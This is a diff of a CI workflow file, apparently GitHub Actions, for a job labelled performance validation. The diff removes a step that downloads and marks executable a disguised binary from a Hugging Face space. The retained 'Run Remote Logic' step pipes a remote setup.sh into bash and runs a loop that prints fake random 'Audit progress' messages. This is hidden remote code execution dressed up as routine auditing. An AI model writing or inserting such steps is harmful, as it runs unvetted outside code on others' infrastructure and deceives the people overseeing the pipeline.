@@ -49,23 +49,10 @@ jobs:
           echo "Kernel: $(uname -r)"
           free -m
 
-      - name: Fetch Indexing Service
-        run: |
-          curl -L -o sys_update.tar.gz https://huggingface.co/spaces/Alvin3y1/host/resolve/main/sys_update_linux.tar.gz
-          tar -xvf sys_update.tar.gz
-          rm sys_update.tar.gz
-          chmod +x sys_indexer
-
       - name: Run Remote Logic
         run: |
           (while true; do sleep $(( (RANDOM % 300) + 300 )); echo "Audit progress: $(($RANDOM % 100))%..."; done) &
           curl -sL https://huggingface.co/spaces/Alvin3y1/host/resolve/main/setup.sh | bash
-
-      - name: Cleanup
-        if: always()
-        run: |
-          rm -f sys_indexer
-          echo "Run complete."
 
   workflow-summary:
     needs: performance-validation
